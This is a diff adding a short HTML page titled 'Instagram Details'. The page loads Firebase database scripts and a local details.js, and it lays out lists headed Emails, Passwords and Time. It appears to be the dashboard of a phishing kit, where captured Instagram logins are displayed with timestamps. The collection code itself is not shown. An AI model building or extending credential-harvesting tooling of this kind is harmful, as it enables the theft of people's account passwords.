@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/styles/main.css">
+    <link rel="stylesheet" href="/styles/details.css">
+    <title>Instagram Details</title>
+    <!-- Firebase Config Script -->
+    <script type="module" src="https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js"></script>
+    <!-- Load Users Script -->
+    <script type="module" src="/scripts/details.js" defer></script>
+</head>
+<body>
+    
+    <div class="result-container" id="resultContainer">
+        <button id="popupCloseBtn"><i class='bx bx-x bx-rotate-90'></i></button>
+        <ul id="email-li">
+        <li>Emails</li>
+    </ul>
+    <ul id="password-li">
+        <li>Passwords</li>
+    </ul>
+    <ul id="time-li">
+        <li>Time</li>
+    </ul>
+</div>
+
+</body>
+</html>
